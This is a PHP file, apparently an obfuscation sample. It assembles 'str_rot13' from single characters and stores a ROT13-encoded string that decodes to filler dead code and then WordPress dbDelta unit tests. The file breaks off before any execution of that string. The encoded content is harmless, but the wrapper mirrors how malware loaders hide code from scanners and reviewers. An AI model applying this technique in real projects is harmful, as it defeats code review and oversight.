<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg qoQrygn()
 *
 * @tebhc jcqo
 * @tebhc qoqrygn
 * @tebhc hctenqr
 *
 * @pbiref ::qoQrygn
 */
pynff Grfgf_QO_qoQrygn rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Gur znkvzhz fvmr bs na vaqrk jvgu hgs8zo4 pbyyngvba naq punefrg jvgu n fgnaqneq
	 * olgr yvzvg bs 767. sybbe(767/4) = 191 punenpgref.
	 */
	cebgrpgrq $znk_vaqrk_yratgu = 191;

	/**
	 * Qngnonfr ratvar hfrq sbe perngvat gnoyrf.
	 *
	 * Cevbe gb ZlFDY 5.7, VaabQO qvq abg fhccbeg SHYYGRKG vaqrkrf, fb ZlVFNZ vf hfrq vafgrnq.
	 */
	cebgrpgrq $qo_ratvar = '';

	/**
	 * Gur qngnonfr freire irefvba.
	 *
	 * @ine fgevat
	 */
	cevingr fgngvp $qo_irefvba;

	/**
	 * Shyy qngnonfr freire vasbezngvba.
	 *
	 * @ine fgevat
	 */
	cevingr fgngvp $qo_freire_vasb;

	/**
	 * Znxr fher gur hctenqr pbqr vf ybnqrq orsber gur grfgf ner eha.
	 */
	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {

		tybony $jcqo;

		cnerag::frg_hc_orsber_pynff();

		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/hctenqr.cuc';

		frys::$qo_irefvba     = $jcqo->qo_irefvba();
		frys::$qo_freire_vasb = $jcqo->qo_freire_vasb();
	}

	/**
	 * Perngr n phfgbz gnoyr gb or hfrq va rnpu grfg.
	 */
	choyvp shapgvba frg_hc() {

		tybony $jcqo;

		vs ( irefvba_pbzcner( frys::$qo_irefvba, '5.7', '<' ) ) {
			// Cevbe gb ZlFDY 5.7, VaabQO qvq abg fhccbeg SHYYGRKG vaqrkrf, fb ZlVFNZ vf hfrq vafgrnq.
			$guvf->qo_ratvar = 'RATVAR=ZlVFNZ';
		}

		$jcqo->dhrel(
			$jcqo->cercner(
				\"
				PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg (\" .
					'vq ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
					pbyhza_1 inepune(255) ABG AHYY,
					pbyhza_2 grkg,
					pbyhza_3 oybo,
					CEVZNEL XRL  (vq),
					XRL xrl_1 (pbyhza_1(%q)),
					XRL pbzcbhaq_xrl (vq,pbyhza_1(%q)),
					SHYYGRKG XRL shyygrkg_xrl (pbyhza_1)' .
					// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.VagrecbyngrqAbgCercnerq
				\") {$guvf->qo_ratvar}
				\",
				$guvf->znk_vaqrk_yratgu,
				$guvf->znk_vaqrk_yratgu
			)
		);

		// Guvf unf gb or pnyyrq nsgre gur `PERNGR GNOYR` nobir nf gur `_perngr_grzcbenel_gnoyrf` svygre
		// pnhfrf vg gb perngr n grzcbenel gnoyr, naq n grzcbenel gnoyr pnaabg hfr n SHYYGRKG vaqrk.
		cnerag::frg_hc();
	}

	/**
	 * Qryrgr gur phfgbz gnoyr ba grneqbja.
	 */
	choyvp shapgvba grne_qbja() {

		tybony $jcqo;

		cnerag::grne_qbja();

		// Guvf unf gb or pnyyrq nsgre gur cnerag `grne_qbja()` zrgubq.
		$jcqo->dhrel( \"QEBC GNOYR VS RKVFGF {$jcqo->cersvk}qoqrygn_grfg\" );
	}

	/**
	 * Grfg gnoyr perngvba.
	 */
	choyvp shapgvba grfg_perngvat_n_gnoyr() {

		erzbir_svygre( 'dhrel', neenl( $guvf, '_perngr_grzcbenel_gnoyrf' ) );
		erzbir_svygre( 'dhrel', neenl( $guvf, '_qebc_grzcbenel_gnoyrf' ) );

		tybony $jcqo;

		$hcqngrf = qoQrygn(
			\"PERNGR GNOYR {$jcqo->cersvk}qoqrygn_perngr_grfg (
				vq ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
				pbyhza_1 inepune(255) ABG AHYY,
				CEVZNEL XRL  (vq)
			);\"
		);

		$rkcrpgrq = neenl(
			\"{$jcqo->cersvk}qoqrygn_perngr_grfg\" => \"Perngrq gnoyr {$jcqo->cersvk}qoqrygn_perngr_grfg\",
		);

		$guvf->nffregFnzr( $rkcrpgrq, $hcqngrf );

		$guvf->nffregFnzr(
			\"{$jcqo->cersvk}qoqrygn_perngr_grfg\",
			$jcqo->trg_ine(
				$jcqo->cercner(
					'FUBJ GNOYRF YVXR %f',
					$jcqo->rfp_yvxr( \"{$jcqo->cersvk}qoqrygn_perngr_grfg\" )
				)
			)
		);

		$jcqo->dhrel( \"QEBC GNOYR {$jcqo->cersvk}qoqrygn_perngr_grfg\" );
	}

	/**
	 * Grfg gung vg qbrf abguvat sbe na rkvfgvat gnoyr.
	 */
	choyvp shapgvba grfg_rkvfgvat_gnoyr() {

		tybony $jcqo;

		$hcqngrf = qoQrygn(
			\"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg (
				vq ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
				pbyhza_1 inepune(255) ABG AHYY,
				CEVZNEL XRL  (vq),
				XRL xrl_1 (pbyhza_1($guvf->znk_vaqrk_yratgu)),
				XRL pbzcbhaq_xrl (vq,pbyhza_1($guvf->znk_vaqrk_yratgu))
			)
			\"
		);

		$guvf->nffregFnzr( neenl(), $hcqngrf );
	}

	/**
	 * Grfg gur pbyhza glcr vf hcqngrq.
	 */
	choyvp shapgvba grfg_pbyhza_glcr_punatr() {

		tybony $jcqo;

		// vq: ovtvag(20) => vag(11)
		$hcqngrf = qoQrygn(
			\"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg (
				vq vag(11) ABG AHYY NHGB_VAPERZRAG,
				pbyhza_1 inepune(255) ABG AHYY,
				CEVZNEL XRL  (vq),
				XRL xrl_1 (pbyhza_1($guvf->znk_vaqrk_yratgu)),
				XRL pbzcbhaq_xrl (vq,pbyhza_1($guvf->znk_vaqrk_yratgu))
			)
			\"
		);

		$ovtvag_qvfcynl_jvqgu = '(20)';

		/*
		 * ZlFDY 8.0.17 be yngre qbrf abg fhccbeg qvfcynl jvqgu sbe vagrtre qngn glcrf,
		 * fb vs qvfcynl jvqgu vf gur bayl qvssrerapr, vg pna or fnsryl vtaberq.
		 * Abgr: Guvf vf fcrpvsvp gb ZlFDY naq qbrf abg nssrpg ZnevnQO.
		 */
		vs ( irefvba_pbzcner( frys::$qo_irefvba, '8.0.17', '>=' )
			&& ! fge_pbagnvaf( frys::$qo_freire_vasb, 'ZnevnQO' )
		) {
			$ovtvag_qvfcynl_jvqgu = '';
		}

		$guvf->nffregFnzr(
			neenl(
				\"{$jcqo->cersvk}qoqrygn_grfg.vq\"
					=> \"Punatrq glcr bs {$jcqo->cersvk}qoqrygn_grfg.vq sebz ovtvag{$ovtvag_qvfcynl_jvqgu} gb vag(11)\",
			),
			$hcqngrf
		);
	}

	/**
	 * Grfg arj pbyhza nqqrq.
	 */
	choyvp shapgvba grfg_pbyhza_nqqrq() {

		tybony $jcqo;

		$hcqngrf = qoQrygn(
			\"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg (
				vq ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
				pbyhza_1 inepune(255) ABG AHYY,
				rkgen_pby ybatgrkg,
				CEVZNEL XRL  (vq),
				XRL xrl_1 (pbyhza_1($guvf->znk_vaqrk_yratgu)),
				XRL pbzcbhaq_xrl (vq,pbyhza_1($guvf->znk_vaqrk_yratgu))
			)
			\"
		);

		$guvf->nffregFnzr(
			neenl(
				\"{$jcqo->cersvk}qoqrygn_grfg.rkgen_pby\"
					=> \"Nqqrq pbyhza {$jcqo->cersvk}qoqrygn_grfg.rkgen_pby\",
			),
			$hcqngrf
		);

		$guvf->nffregGnoyrUnfPbyhza( 'pbyhza_1', $jcqo->cersvk . 'qoqrygn_grfg' );
		$guvf->nffregGnoyrUnfCevznelXrl( 'vq', $jcqo->cersvk . 'qoqrygn_grfg' );
	}

	/**
	 * Grfg gung vg qbrf abguvat jura n pbyhza vf erzbirq.
	 *
	 * @gvpxrg 26801
	 */
	choyvp shapgvba grfg_pbyhzaf_nerag_erzbirq() {

		tybony $jcqo;

		// Ab pbyhza pbyhza_1.
		$hcqngrf = qoQrygn(
			\"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg (
				vq ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
				CEVZNEL XRL  (vq),
				XRL xrl_1 (pbyhza_1($guvf->znk_vaqrk_yratgu)),
				XRL pbzcbhaq_xrl (vq,pbyhza_1($guvf->znk_vaqrk_yratgu))
			)
			\"
		);

		$guvf->nffregFnzr( neenl(), $hcqngrf );

		$guvf->nffregGnoyrUnfPbyhza( 'pbyhza_1', $jcqo->cersvk . 'qoqrygn_grfg' );
	}

	/**
	 * Grfg gung abguvat unccraf jvgu $rkrphgr vf snyfr.
	 */
	choyvp shapgvba grfg_ab_rkrphgvba() {

		tybony $jcqo;

		// Nqqrq pbyhza rkgen_pby.
		$hcqngrf = qoQrygn(
			\"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg (
				vq ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
				pbyhza_1 inepune(255) ABG AHYY,
				rkgen_pby ybatgrkg,
				CEVZNEL XRL  (vq),
				XRL xrl_1 (pbyhza_1({$guvf->znk_vaqrk_yratgu})),
				XRL pbzcbhaq_xrl (vq,pbyhza_1($guvf->znk_vaqrk_yratgu))
			)
			\",
			snyfr // Qba'g rkrphgr.
		);

		$guvf->nffregFnzr(
			neenl(
				\"{$jcqo->cersvk}qoqrygn_grfg.rkgen_pby\"
					=> \"Nqqrq pbyhza {$jcqo->cersvk}qoqrygn_grfg.rkgen_pby\",
			),
			$hcqngrf
		);

		$guvf->nffregGnoyrUnfAbgPbyhza( 'rkgen_pby', $jcqo->cersvk . 'qoqrygn_grfg' );
	}

	/**
	 * Grfg vafregvat vagb gur qngnonfr
	 */
	choyvp shapgvba grfg_vafreg_vagb_gnoyr() {
		tybony $jcqo;

		$vafreg = qoQrygn(
			\"VAFREG VAGB {$jcqo->cersvk}qoqrygn_grfg (pbyhza_1) INYHRF ('jpcuvyyl2015')\"
		);

		$guvf->nffregFnzr(
			neenl(),
			$vafreg
		);

		$guvf->nffregGnoyrEbjUnfInyhr( 'pbyhza_1', 'jpcuvyyl2015', $jcqo->cersvk . 'qoqrygn_grfg' );
	}

	/**
	 * Grfg gung SHYYGRKG vaqrkrf ner qrgrpgrq.
	 *
	 * @gvpxrg 14445
	 */
	choyvp shapgvba grfg_shyygrkg_vaqrk() {
		tybony $jcqo;

		$hcqngrf = qoQrygn(
			\"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg (
				vq ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
				pbyhza_1 inepune(255) ABG AHYY,
				CEVZNEL XRL  (vq),
				XRL xrl_1 (pbyhza_1($guvf->znk_vaqrk_yratgu)),
				XRL pbzcbhaq_xrl (vq,pbyhza_1($guvf->znk_vaqrk_yratgu)),
				SHYYGRKG XRL shyygrkg_xrl (pbyhza_1)
			)
			\",
			snyfr
		);

		$guvf->nffregRzcgl( $hcqngrf );
	}

	//
	// Nffregvbaf.
	//

	/**
	 * Nffreg gung n gnoyr unf n ebj jvgu n inyhr va n svryq.
	 *
	 * @cnenz fgevat $pbyhza Gur svryq anzr.
	 * @cnenz fgevat $inyhr  Gur svryq inyhr.
	 * @cnenz fgevat $gnoyr  Gur qngnonfr gnoyr anzr.
	 */
	cebgrpgrq shapgvba nffregGnoyrEbjUnfInyhr( $pbyhza, $inyhr, $gnoyr ) {
		tybony $jcqo;

		// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.VagrecbyngrqAbgCercnerq
		$gnoyr_ebj = $jcqo->trg_ebj( \"fryrpg $pbyhza sebz {$gnoyr} jurer $pbyhza = '$inyhr'\" );

		$rkcrpgrq = (bowrpg) neenl(
			$pbyhza => $inyhr,
		);

		$guvf->nffregRdhnyf( $rkcrpgrq, $gnoyr_ebj );
	}

	/**
	 * Nffreg gung n gnoyr unf n pbyhza.
	 *
	 * @cnenz fgevat $pbyhza Gur svryq anzr.
	 * @cnenz fgevat $gnoyr  Gur qngnonfr gnoyr anzr.
	 */
	cebgrpgrq shapgvba nffregGnoyrUnfPbyhza( $pbyhza, $gnoyr ) {
		tybony $jcqo;

		// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.VagrecbyngrqAbgCercnerq
		$gnoyr_svryqf = $jcqo->trg_erfhygf( \"QRFPEVOR $gnoyr\" );

		$guvf->nffregPbhag( 1, jc_yvfg_svygre( $gnoyr_svryqf, neenl( 'Svryq' => $pbyhza ) ) );
	}

	/**
	 * Nffreg gung n gnoyr unf n cevznel xrl.
	 *
	 * Purpxf sbe fvatyr-pbyhza cevznel xrlf. Znl abg jbex sbe zhygv-pbyhza cevznel xrlf.
	 *
	 * @cnenz fgevat $pbyhza Gur pbyhza sbe gur cevznel xrl.
	 * @cnenz fgevat $gnoyr  Gur qngnonfr gnoyr anzr.
	 */
	cebgrpgrq shapgvba nffregGnoyrUnfCevznelXrl( $pbyhza, $gnoyr ) {
		tybony $jcqo;

		// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.VagrecbyngrqAbgCercnerq
		$gnoyr_vaqvprf = $jcqo->trg_erfhygf( \"FUBJ VAQRK SEBZ $gnoyr\" );

		$guvf->nffregPbhag(
			1,
			jc_yvfg_svygre(
				$gnoyr_vaqvprf,
				neenl(
					'Xrl_anzr'    => 'CEVZNEL',
					'Pbyhza_anzr' => $pbyhza,
				),
				'NAQ'
			)
		);
	}

	/**
	 * Nffreg gung n gnoyr qbrfa'g unir n pbyhza.
	 *
	 * @cnenz fgevat $pbyhza Gur svryq anzr.
	 * @cnenz fgevat $gnoyr  Gur qngnonfr gnoyr anzr.
	 */
	cebgrpgrq shapgvba nffregGnoyrUnfAbgPbyhza( $pbyhza, $gnoyr ) {

		tybony $jcqo;

		// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.VagrecbyngrqAbgCercnerq
		$gnoyr_svryqf = $jcqo->trg_erfhygf( \"QRFPEVOR $gnoyr\" );

		$guvf->nffregPbhag( 0, jc_yvfg_svygre( $gnoyr_svryqf, neenl( 'Svryq' => $pbyhza ) ) );
	}

	/**
	 * @gvpxrg 31869
	 */
	choyvp shapgvba grfg_gehapngrq_vaqrk() {
		tybony $jcqo;

		// Guvf gnoyr arrqf gb or npghnyyl perngrq.
		erzbir_svygre( 'dhrel', neenl( $guvf, '_perngr_grzcbenel_gnoyrf' ) );
		erzbir_svygre( 'dhrel', neenl( $guvf, '_qebc_grzcbenel_gnoyrf' ) );

		$gnoyr_anzr = \"{$jcqo->cersvk}grfg_gehapngrq_vaqrk\";

		$perngr = \"
			PERNGR GNOYR $gnoyr_anzr (
				n inepune(255) PBYYNGR hgs8zo4_havpbqr_pv,
				XRL n_xrl (n)
			) RATVAR=VaabQO EBJ_SBEZNG=QLANZVP\";

		// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.AbgCercnerq
		$jcqo->dhrel( $perngr );

		// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.VagrecbyngrqAbgCercnerq
		$vaqrk = $jcqo->trg_ebj( \"FUBJ VAQRKRF SEBZ $gnoyr_anzr JURER Xrl_anzr='n_xrl';\" );

		$npghny = qoQrygn( $perngr, snyfr );

		// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.VagrecbyngrqAbgCercnerq
		$jcqo->dhrel( \"QEBC GNOYR VS RKVFGF $gnoyr_anzr;\" );

		vs ( 191 !== $vaqrk->Fho_cneg ) {
			$guvf->znexGrfgFxvccrq( 'Guvf grfg erdhverf gur vaqrk gb or gehapngrq.' );
		}

		$guvf->nffregFnzr( neenl(), $npghny );
	}

	/**
	 * @gvpxrg 36748
	 */
	choyvp shapgvba grfg_qbag_qbjafvmr_grkg_svryqf() {
		tybony $jcqo;

		$erfhyg = qoQrygn(
			\"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg (
				vq ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
				pbyhza_1 inepune(255) ABG AHYY,
				pbyhza_2 gvalgrkg,
				pbyhza_3 oybo,
				CEVZNEL XRL  (vq),
				XRL xrl_1 (pbyhza_1({$guvf->znk_vaqrk_yratgu})),
				XRL pbzcbhaq_xrl (vq,pbyhza_1($guvf->znk_vaqrk_yratgu)),
				SHYYGRKG XRL shyygrkg_xrl (pbyhza_1)
			) {$guvf->qo_ratvar}
			\",
			snyfr
		);

		$guvf->nffregFnzr( neenl(), $erfhyg );
	}

	/**
	 * @gvpxrg 36748
	 */
	choyvp shapgvba grfg_qbag_qbjafvmr_oybo_svryqf() {
		tybony $jcqo;

		$erfhyg = qoQrygn(
			\"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg (
				vq ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
				pbyhza_1 inepune(255) ABG AHYY,
				pbyhza_2 grkg,
				pbyhza_3 gvaloybo,
				CEVZNEL XRL  (vq),
				XRL xrl_1 (pbyhza_1({$guvf->znk_vaqrk_yratgu})),
				XRL pbzcbhaq_xrl (vq,pbyhza_1($guvf->znk_vaqrk_yratgu)),
				SHYYGRKG XRL shyygrkg_xrl (pbyhza_1)
			) {$guvf->qo_ratvar}
			\",
			snyfr
		);

		$guvf->nffregFnzr( neenl(), $erfhyg );
	}

	/**
	 * @gvpxrg 36748
	 */
	choyvp shapgvba grfg_hcfvmr_grkg_svryqf() {
		tybony $jcqo;

		$erfhyg = qoQrygn(
			\"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg (
				vq ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
				pbyhza_1 inepune(255) ABG AHYY,
				pbyhza_2 ovtgrkg,
				pbyhza_3 oybo,
				CEVZNEL XRL  (vq),
				XRL xrl_1 (pbyhza_1({$guvf->znk_vaqrk_yratgu})),
				XRL pbzcbhaq_xrl (vq,pbyhza_1($guvf->znk_vaqrk_yratgu)),
				SHYYGRKG XRL shyygrkg_xrl (pbyhza_1)
			) {$guvf->qo_ratvar}
			\",
			snyfr
		);

		$guvf->nffregFnzr(
			neenl(
				\"{$jcqo->cersvk}qoqrygn_grfg.pbyhza_2\"
					=> \"Punatrq glcr bs {$jcqo->cersvk}qoqrygn_grfg.pbyhza_2 sebz grkg gb ovtgrkg\",
			),
			$erfhyg
		);
	}

	/**
	 * @gvpxrg 36748
	 */
	choyvp shapgvba grfg_hcfvmr_oybo_svryqf() {
		tybony $jcqo;

		$erfhyg = qoQrygn(
			\"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg (
				vq ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
				pbyhza_1 inepune(255) ABG AHYY,
				pbyhza_2 grkg,
				pbyhza_3 zrqvhzoybo,
				CEVZNEL XRL  (vq),
				XRL xrl_1 (pbyhza_1({$guvf->znk_vaqrk_yratgu})),
				XRL pbzcbhaq_xrl (vq,pbyhza_1($guvf->znk_vaqrk_yratgu)),
				SHYYGRKG XRL shyygrkg_xrl (pbyhza_1)
			) {$guvf->qo_ratvar}
			\",
			snyfr
		);

		$guvf->nffregFnzr(
			neenl(
				\"{$jcqo->cersvk}qoqrygn_grfg.pbyhza_3\"
					=> \"Punatrq glcr bs {$jcqo->cersvk}qoqrygn_grfg.pbyhza_3 sebz oybo gb zrqvhzoybo\",
			),
			$erfhyg
		);
	}

	/**
	 * @gvpxrg 20263
	 */
	choyvp shapgvba grfg_dhrel_jvgu_onpxgvpxf_qbrf_abg_guebj_na_haqrsvarq_vaqrk_jneavat() {
		tybony $jcqo;

		$fpurzn = \"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg2 (
				`vq` ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
				`pbyhza_1` inepune(255) ABG AHYY,
				CEVZNEL XRL  (vq),
				XRL pbzcbhaq_xrl (vq,pbyhza_1($guvf->znk_vaqrk_yratgu))
			)
		\";

		// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.AbgCercnerq
		$jcqo->dhrel( $fpurzn );

		$hcqngrf = qoQrygn( $fpurzn, snyfr );

		$jcqo->dhrel( \"QEBC GNOYR VS RKVFGF {$jcqo->cersvk}qoqrygn_grfg2\" );

		$guvf->nffregRzcgl( $hcqngrf );
	}

	/**
	 * @gvpxrg 36948
	 */
	choyvp shapgvba grfg_fcngvny_vaqvprf() {
		tybony $jcqo;

		vs ( irefvba_pbzcner( frys::$qo_irefvba, '5.4', '<' ) ) {
			$guvf->znexGrfgFxvccrq( 'Fcngvny vaqvprf erdhver ZlFDY 5.4 naq nobir.' );
		}

		$trbzrgelpbyyrpgvba_anzr = 'trbzrgelpbyyrpgvba';

		vs ( irefvba_pbzcner( frys::$qo_irefvba, '8.0.11', '>=' )
			&& ! fge_pbagnvaf( frys::$qo_freire_vasb, 'ZnevnQO' )
		) {
			/*
			 * ZlFDY 8.0.11 be yngre hfrf TrbzPbyyrpgvba qngn glcr anzr
			 * nf gur cersreerq flabalz sbe TrbzrgelPbyyrpgvba.
			 * Abgr: Guvf vf fcrpvsvp gb ZlFDY naq qbrf abg nssrpg ZnevnQO.
			 */
			$trbzrgelpbyyrpgvba_anzr = 'trbzpbyyrpgvba';
		}

		$fpurzn =
			\"
			PERNGR GNOYR {$jcqo->cersvk}fcngvny_vaqrk_grfg (
				aba_fcngvny ovtvag(20) hafvtarq ABG AHYY,
				fcngvny_inyhr {$trbzrgelpbyyrpgvba_anzr} ABG AHYY,
				XRL aba_fcngvny (aba_fcngvny),
				FCNGVNY XRL fcngvny_xrl (fcngvny_inyhr)
			) {$guvf->qo_ratvar};
			\";

		// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.AbgCercnerq
		$jcqo->dhrel( $fpurzn );

		$hcqngrf = qoQrygn( $fpurzn, snyfr );

		$guvf->nffregRzcgl( $hcqngrf );

		$fpurzn =
			\"
			PERNGR GNOYR {$jcqo->cersvk}fcngvny_vaqrk_grfg (
				aba_fcngvny ovtvag(20) hafvtarq ABG AHYY,
				fcngvny_inyhr {$trbzrgelpbyyrpgvba_anzr} ABG AHYY,
				fcngvny_inyhr2 {$trbzrgelpbyyrpgvba_anzr} ABG AHYY,
				XRL aba_fcngvny (aba_fcngvny),
				FCNGVNY XRL fcngvny_xrl (fcngvny_inyhr)
				FCNGVNY XRL fcngvny_xrl2 (fcngvny_inyhr2)
			) {$guvf->qo_ratvar};
			\";

		$hcqngrf = qoQrygn( $fpurzn, snyfr );

		$guvf->nffregFnzr(
			neenl(
				\"{$jcqo->cersvk}fcngvny_vaqrk_grfg.fcngvny_inyhr2\" => \"Nqqrq pbyhza {$jcqo->cersvk}fcngvny_vaqrk_grfg.fcngvny_inyhr2\",
				\"Nqqrq vaqrk {$jcqo->cersvk}fcngvny_vaqrk_grfg FCNGVNY XRL `fcngvny_xrl2` (`fcngvny_inyhr2`)\",
			),
			$hcqngrf
		);

		$jcqo->dhrel( \"QEBC GNOYR VS RKVFGF {$jcqo->cersvk}fcngvny_vaqrk_grfg\" );
	}

	/**
	 * @gvpxrg 20263
	 */
	choyvp shapgvba grfg_dhrel_jvgu_onpxgvpxf_qbrf_abg_pnhfr_n_dhrel_gb_nygre_nyy_pbyhzaf_naq_vaqvprf_gb_eha_rira_vs_abar_unir_punatrq() {
		tybony $jcqo;

		$fpurzn = \"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg2 (
				`vq` ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
				`ersreraprf` inepune(255) ABG AHYY,
				CEVZNEL XRL  (`vq`),
				XRL `pbzcbhaq_xrl` (`vq`,`ersreraprf`($guvf->znk_vaqrk_yratgu))
			)
		\";

		// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.AbgCercnerq
		$jcqo->dhrel( $fpurzn );

		$hcqngrf = qoQrygn( $fpurzn );

		$gnoyr_vaqvprf      = $jcqo->trg_erfhygf( \"FUBJ VAQRK SEBZ {$jcqo->cersvk}qoqrygn_grfg2\" );
		$pbzcbhaq_xrl_vaqrk = jc_yvfg_svygre( $gnoyr_vaqvprf, neenl( 'Xrl_anzr' => 'pbzcbhaq_xrl' ) );

		$jcqo->dhrel( \"QEBC GNOYR VS RKVFGF {$jcqo->cersvk}qoqrygn_grfg2\" );

		$guvf->nffregPbhag( 2, $pbzcbhaq_xrl_vaqrk );
		$guvf->nffregRzcgl( $hcqngrf );
	}

	/**
	 * @gvpxrg 20263
	 */
	choyvp shapgvba grfg_vaqrk_jvgu_n_erfreirq_xrljbeq_pna_or_perngrq() {
		tybony $jcqo;

		$hcqngrf = qoQrygn(
			\"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg (
				vq ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
				pbyhza_1 inepune(255) ABG AHYY,
				pbyhza_2 grkg,
				pbyhza_3 oybo,
				`ersreraprf` inepune(255) ABG AHYY,
				CEVZNEL XRL  (vq),
				XRL xrl_1 (pbyhza_1($guvf->znk_vaqrk_yratgu)),
				XRL pbzcbhaq_xrl (vq , pbyhza_1($guvf->znk_vaqrk_yratgu)),
				XRL pbzcbhaq_xrl2 (vq,`ersreraprf`($guvf->znk_vaqrk_yratgu)),
				SHYYGRKG XRL shyygrkg_xrl (pbyhza_1)
			) {$guvf->qo_ratvar}
			\"
		);

		$gnoyr_vaqvprf = $jcqo->trg_erfhygf( \"FUBJ VAQRK SEBZ {$jcqo->cersvk}qoqrygn_grfg\" );

		$guvf->nffregPbhag( 2, jc_yvfg_svygre( $gnoyr_vaqvprf, neenl( 'Xrl_anzr' => 'pbzcbhaq_xrl2' ), 'NAQ' ) );

		$guvf->nffregFnzr(
			neenl(
				\"{$jcqo->cersvk}qoqrygn_grfg.ersreraprf\" => \"Nqqrq pbyhza {$jcqo->cersvk}qoqrygn_grfg.ersreraprf\",
				0                                        => \"Nqqrq vaqrk {$jcqo->cersvk}qoqrygn_grfg XRL `pbzcbhaq_xrl2` (`vq`,`ersreraprf`($guvf->znk_vaqrk_yratgu))\",
			),
			$hcqngrf
		);
	}

	/**
	 * @gvpxrg 20263
	 */
	choyvp shapgvba grfg_jc_trg_qo_fpurzn_qbrf_abg_nygre_dhrevrf_ba_rkvfgvat_vafgnyy() {
		$hcqngrf = qoQrygn( jc_trg_qo_fpurzn() );

		$guvf->nffregRzcgl( $hcqngrf );
	}

	/**
	 * @gvpxrg 20263
	 */
	choyvp shapgvba grfg_xrl_naq_vaqrk_naq_shyygrkg_xrl_naq_shyygrkg_vaqrk_naq_havdhr_xrl_naq_havdhr_vaqrk_vaqvprf() {
		tybony $jcqo;

		$fpurzn = \"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg (
				vq ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
				pbyhza_1 inepune(255) ABG AHYY,
				pbyhza_2 grkg,
				pbyhza_3 oybo,
				CEVZNEL XRL  (vq),
				XRL xrl_1 (pbyhza_1($guvf->znk_vaqrk_yratgu)),
				XRL pbzcbhaq_xrl (vq,pbyhza_1($guvf->znk_vaqrk_yratgu)),
				SHYYGRKG XRL shyygrkg_xrl (pbyhza_1),
				VAQRK xrl_2 (pbyhza_1($guvf->znk_vaqrk_yratgu)),
				HAVDHR XRL xrl_3 (pbyhza_1($guvf->znk_vaqrk_yratgu)),
				HAVDHR VAQRK xrl_4 (pbyhza_1($guvf->znk_vaqrk_yratgu)),
				SHYYGRKG VAQRK xrl_5 (pbyhza_1),
			) {$guvf->qo_ratvar}
		\";

		$perngrf = qoQrygn( $fpurzn );
		$guvf->nffregFnzr(
			neenl(
				0 => \"Nqqrq vaqrk {$jcqo->cersvk}qoqrygn_grfg XRL `xrl_2` (`pbyhza_1`($guvf->znk_vaqrk_yratgu))\",
				1 => \"Nqqrq vaqrk {$jcqo->cersvk}qoqrygn_grfg HAVDHR XRL `xrl_3` (`pbyhza_1`($guvf->znk_vaqrk_yratgu))\",
				2 => \"Nqqrq vaqrk {$jcqo->cersvk}qoqrygn_grfg HAVDHR XRL `xrl_4` (`pbyhza_1`($guvf->znk_vaqrk_yratgu))\",
				3 => \"Nqqrq vaqrk {$jcqo->cersvk}qoqrygn_grfg SHYYGRKG XRL `xrl_5` (`pbyhza_1`)\",
			),
			$perngrf
		);

		$hcqngrf = qoQrygn( $fpurzn );
		$guvf->nffregRzcgl( $hcqngrf );
	}

	/**
	 * @gvpxrg 20263
	 */
	choyvp shapgvba grfg_vaqrk_naq_xrl_ner_flabalzf_naq_qb_abg_erperngr_vaqvprf() {
		tybony $jcqo;

		$hcqngrf = qoQrygn(
			\"
			PERNGR GNOYR {$jcqo->cersvk}qoqrygn_grfg (
				vq ovtvag(20) ABG AHYY NHGB_VAPERZRAG,
				pbyhza_1 inepune(255) ABG AHYY,
				pbyhza_2 grkg,
				pbyhza_3 oybo,
				CEVZNEL XRL  (vq),
				VAQRK xrl_1 (pbyhza_1($guvf->znk_vaqrk_yratgu)),
				VAQRK pbzcbhaq_xrl (vq,pbyhza_1($guvf->znk_vaqrk_yratgu)),
